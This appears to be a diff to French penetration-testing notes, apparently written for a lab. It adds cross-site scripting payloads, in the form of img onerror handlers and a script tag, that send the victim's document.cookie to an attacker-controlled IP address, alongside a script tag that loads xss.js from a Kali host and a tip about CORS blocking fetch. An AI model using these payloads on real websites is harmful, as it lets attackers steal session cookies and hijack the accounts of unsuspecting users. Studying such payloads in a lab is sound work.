@@ -119,6 +119,10 @@ python3 -m http.server 80
 ```html
 <!-- Payload injecté dans la cible -->
 <script src="http://KALI_IP/xss.js"></script>
+<img src=x onerror="fetch('http://192.168.49.64/?c='+document.cookie)"> //fetch dans onerror peut etre bloqué par les CORS
+<img src=x onerror="document.location='http://192.168.49.64/?c='+document.cookie">
+
+<script>document.location='http://192.168.49.64/?c='+document.cookie</script>
 ```
 
 **Lire les logs** pour confirmer exécution :
